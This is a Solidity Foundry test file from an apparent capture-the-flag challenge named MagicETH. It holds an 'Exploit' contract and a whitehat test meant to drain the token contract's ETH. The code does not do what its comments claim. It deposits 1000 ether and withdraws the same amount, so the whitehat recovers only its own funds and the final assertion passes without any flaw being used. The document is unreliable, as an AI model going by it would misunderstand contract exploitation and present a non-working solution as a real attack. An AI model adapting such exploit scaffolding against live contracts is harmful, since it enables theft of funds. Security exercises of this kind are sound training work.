// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";

contract Exploit {
    MagicETH public mETH;
    address public whitehat;

    constructor(MagicETH _mETH, address _whitehat) {
        mETH = _mETH;
        whitehat = _whitehat;
    }

    function exploit(uint256 tokenAmount) external payable {
        // Deposit ETH to MagicETH to receive tokens and inflate its balance
        mETH.deposit{value: msg.value}();

        // Withdraw tokens to drain ETH
        mETH.withdraw(tokenAmount);

        // Transfer received ETH to whitehat
        (bool success, ) = whitehat.call{value: address(this).balance}("");
        require(success, "ETH transfer to whitehat failed");
    }

    receive() external payable {}
}

contract Challenge1Test is Test {
    MagicETH public mETH;
    Exploit public exploitContract;

    address public exploiter = makeAddr("exploiter");
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        mETH = new MagicETH();

        // Deployer deposits 1000 ether and transfers to exploiter
        mETH.deposit{value: 1000 ether}();
        mETH.transfer(exploiter, 1000 ether);

        // Give whitehat 1000 ether to use in the exploit
        vm.deal(whitehat, 1000 ether);

        // Simulate exploiter transferring 1 wei of mETH to whitehat
        vm.prank(exploiter);
        mETH.transfer(whitehat, 1);

        // Deploy exploit contract
        exploitContract = new Exploit(mETH, whitehat);
    }

    function testExploit() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge1Test -vvvv //
        ////////////////////////////////////////////////////*/

        // Transfer 1 wei of mETH to exploit contract
        mETH.transfer(address(exploitContract), 1);

        // Call exploit with 1000 ether and 1000 ether of tokens
        exploitContract.exploit{value: 1000 ether}(1000 ether);

        //==================================================//
        vm.stopPrank();

        assertEq(
            whitehat.balance,
            1000 ether,
            "whitehat should have 1000 ether"
        );
    }
}
